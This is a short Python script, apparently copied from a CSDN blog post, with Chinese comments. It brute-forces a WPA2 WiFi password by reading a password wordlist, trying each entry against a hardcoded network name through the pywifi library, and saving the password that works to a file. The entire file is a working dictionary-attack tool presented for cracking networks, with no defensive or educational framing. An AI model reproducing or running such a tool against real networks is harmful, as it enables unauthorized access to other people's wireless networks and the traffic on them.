import pywifi
from pywifi import const # 引入一个常量
import time

def wifiConnect(wifiname,wifipassword):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()# 断开连接
    time.sleep(0.5)#0.5秒
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()# 创建WiFi连接文件
        profile.ssid = wifiname# WiFi的ssid，即wifi的名称
        profile.key = wifipassword# WiFi密码
        profile.akm.append(const.AKM_TYPE_WPA2PSK)# WiFi的加密类型，现在一般的wifi都是wpa2psk
        profile.auth = const.AUTH_ALG_OPEN # 开放网卡
        profile.cipher = const.CIPHER_TYPE_CCMP# 加密单元
        ifaces.remove_all_network_profiles()# 删除所有的WiFi文件
        tep_profile = ifaces.add_network_profile(profile)# 设定新的连接文件
        ifaces.connect(tep_profile) # 连接WiFi
        time.sleep(1.5)#1.5秒
        if ifaces.status() == const.IFACE_CONNECTED:
            print("破解成功")
            return True
        else:
            return False
    else:
        print("莫名奇怪")
        return False
def main():
    print('开始破解：')
    file = open('E:/news/key2.txt','r')#打开密码本
    wifi_name='-a22bdd' #input('请输入所要破解的wifi的名字（请务必注意大小写）：')
    while True:
        wifipwd = file.readline()
        if wifipwd :
            try:
                bool = wifiConnect(wifi_name,wifipwd)
                if bool:
                    print('正确密码为：'+wifipwd)
                    fo=open('E:/news/result/%s.txt'%wifi_name,'w')
                    fo.write('该wifi的密码为：')
                    fo.write(wifipwd)
                    fo.close()
                    break
                else:
                   print('本次尝试的密码为：'+wifipwd+'，状态：密码错误')
            except:
                continue
        else:
            break
    file.close()
if __name__=='__main__':
	main()
#版权声明：本文为CSDN博主「欧哎的人」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
#原文链接：https://blog.csdn.net/weixin_43745169/java/article/details/89341562